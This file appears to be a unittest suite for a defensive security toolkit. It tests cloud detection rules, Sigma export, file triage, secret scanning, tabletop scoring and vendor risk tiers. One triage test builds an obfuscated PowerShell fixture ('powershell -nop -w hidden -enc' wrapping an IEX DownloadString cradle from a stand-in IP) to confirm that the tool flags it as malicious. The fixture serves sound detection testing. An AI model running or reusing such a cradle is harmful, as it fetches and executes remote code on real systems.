import json
import tempfile
import unittest
from datetime import date
from pathlib import Path

from westguard.cli import data_path
from westguard.tools import clouddetect, filetriage, kpi, sigma_export, tabletop, vendorrisk
from westguard.tools.cloud_rules import RULES
from westguard.tools.sigma_lite import match_detection


class CloudDetections(unittest.TestCase):
    def test_every_rule_fixture(self):
        for r in RULES:
            with self.subTest(rule=r["id"]):
                if "pos" in r:
                    self.assertTrue(match_detection(r["pos"], r["detection"]))
                    self.assertFalse(match_detection(r["neg"], r["detection"]))
                else:
                    self.assertTrue(clouddetect.run_rule(r, r["pos_series"]))
                    self.assertFalse(clouddetect.run_rule(r, r["neg_series"]))

    def test_loader_formats(self):
        ev = RULES[0]["pos"]
        import gzip
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            (d / "a.json").write_text(json.dumps({"Records": [ev, ev]}))
            with gzip.open(d / "b.json.gz", "wt") as f:
                json.dump({"Records": [ev]}, f)
            (d / "c.jsonl").write_text(json.dumps(ev) + "\n")
            (d / "graph.json").write_text(json.dumps({"value": [ev]}))
            self.assertEqual(len(clouddetect.load(d)), 5)
            (d / "arr.json").write_text(json.dumps([ev, ev]))
            self.assertEqual(len(clouddetect.load(d / "arr.json")), 2)

    def test_sigma_export(self):
        y = sigma_export.to_sigma(RULES[10])
        self.assertIn("correlation:", y)
        try:
            from sigma.collection import SigmaCollection
        except ImportError:
            self.skipTest("pySigma not installed")
        for r in RULES:
            if "python_only" not in r:
                SigmaCollection.from_yaml(sigma_export.to_sigma(r))


class FileTriage(unittest.TestCase):
    def test_entropy_and_types(self):
        self.assertEqual(filetriage.entropy(b"A" * 64), 0.0)
        self.assertEqual(filetriage.file_type(b"MZ\x90\x00"), "pe")
        self.assertEqual(filetriage.file_type(b"%PDF-1.7"), "pdf")

    def test_script_and_ioc(self):
        import base64
        cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a')".encode("utf-16le")).decode()
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "x.ps1"
            p.write_text(f"powershell -nop -w hidden -enc {cmd}\n")
            r = filetriage.triage(p)
            self.assertEqual(r["verdict"], "malicious")
            self.assertIn("http://198.51.100.9/a", r["iocs"]["url"])

    def test_bundled_collectors_are_clean(self):
        for p in data_path("collectors").iterdir():
            self.assertNotEqual(filetriage.triage(p)["verdict"], "malicious", p.name)

    def test_expand_skips_large_and_symlinks(self):
        with tempfile.TemporaryDirectory() as d:
            d = Path(d)
            (d / "small").write_bytes(b"a")
            (d / "big").write_bytes(b"a" * 2048)
            (d / "link").symlink_to(d / "small")
            self.assertEqual([p.name for p in filetriage.expand([d], 1024, log=lambda *_: None)], ["small"])


class Secrets(unittest.TestCase):
    def test_scan_root_inside_skipped_folder_name_still_scans(self):
        """Regression: a scan root under e.g. /opt/build/ or a venv must not be silently skipped."""
        from westguard.tools import secrets
        with tempfile.TemporaryDirectory() as d:
            root = Path(d) / "build" / "app"
            (root / "node_modules").mkdir(parents=True)
            (root / "cfg.py").write_text('AWS_KEY = "AKIA' + 'Q3EGRTZ7LKXN2PWV"\n')
            (root / "node_modules" / "x.js").write_text('k = "AKIA' + 'Q3EGRTZ7LKXN2PWV"\n')
            files = [p.name for p, _ in secrets.iter_files(root, [])]
            self.assertEqual(files, ["cfg.py"])


class Program(unittest.TestCase):
    def test_tabletop_perfect_score(self):
        ex = json.loads(data_path("templates", "ransomware_exercise.json").read_text())
        resp = {"exercise_date": "x", "team": "x", "responses": {str(i["id"]): i["expected"] for i in ex["injects"]}}
        self.assertEqual(tabletop.score(ex, resp)["overall"], 100)

    def test_vendor_tiers(self):
        vs = {v["name"]: v for v in json.loads(data_path("templates", "vendors_example.json").read_text())["vendors"]}
        self.assertEqual(vendorrisk.assess(vs["NetWatch MSP"], date(2026, 11, 21))["tier"], "Critical")
        self.assertEqual(vendorrisk.assess(vs["QuickPrint Supplies"], date(2026, 11, 21))["tier"], "Low")

    def test_kpi_status(self):
        t = {"target": 95, "amber": 85, "better": "higher"}
        self.assertEqual([kpi.status(v, t) for v in (96, 90, 50)], ["good", "warning", "critical"])


if __name__ == "__main__":
    unittest.main()
